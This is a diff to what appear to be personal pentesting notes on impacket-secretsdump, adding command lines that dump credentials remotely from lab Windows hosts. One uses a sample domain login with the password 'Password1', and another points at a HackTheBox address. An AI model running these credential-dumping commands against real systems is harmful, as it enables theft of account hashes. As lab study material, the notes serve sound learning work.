@@ -2,7 +2,10 @@
 [impacket-secretsdump](https://github.com/toneillcodes/cybersecurity-notes/blob/main/windows/tools/impacket-tools.md#impacket-secretsdump)
 ## Remote
 ```
-/usr/local/bin/secretsdump.py htb/john@10.129.240.61
+secretsdump.py MARVEL.local/hacker:'Password1'@10.0.2.15
+```
+```
+/usr/local/bin/secretsdump.py htb/jorge@10.129.240.61
 ```
 ```
 $ /usr/local/bin/secretsdump.py htb/jorge@10.129.240.61
